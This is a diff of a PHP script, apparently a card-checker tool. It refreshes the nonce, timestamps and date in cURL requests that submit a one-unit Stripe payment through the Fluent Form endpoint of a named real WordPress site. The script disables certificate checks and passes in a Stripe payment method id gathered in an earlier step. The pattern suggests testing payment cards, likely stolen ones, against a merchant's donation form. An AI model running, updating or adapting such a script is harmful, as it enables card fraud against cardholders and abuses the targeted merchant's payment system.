@@ -96,7 +96,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 sleep(10);
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://marthahealthsolutions.com/wp-admin/admin-ajax.php?t=1716525183623');
+curl_setopt($ch, CURLOPT_URL, 'https://marthahealthsolutions.com/wp-admin/admin-ajax.php?t=1716440395318');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -107,7 +107,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1716525183623 HTTP/1.1',
+'POST /wp-admin/admin-ajax.php?t=1716440395318 HTTP/1.1',
 'Host: marthahealthsolutions.com',
 'Accept: */*',
 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
@@ -122,7 +122,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 
 ////////////////////////////===[2 Req Postfields]////////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D405%26_fluentform_3_fluentformnonce%3D385efa0cca%26_wp_http_referer%3D%252Fpayment-proceed%252F%26names%255Bfirst_name%255D%3D%26numeric-field%3D%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26email%3D%26phone%3D%26datetime%3D24%252F05%252F2024%26custom-payment-amount%3D1%26numeric-field_1%3D%26description%3D%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D405%26_fluentform_3_fluentformnonce%3D5914def0aa%26_wp_http_referer%3D%252Fpayment-proceed%252F%26names%255Bfirst_name%255D%3D%26numeric-field%3D%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26email%3D%26phone%3D%26datetime%3D23%252F05%252F2024%26custom-payment-amount%3D1%26numeric-field_1%3D%26description%3D%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
 
 $result2 = curl_exec($ch);
 
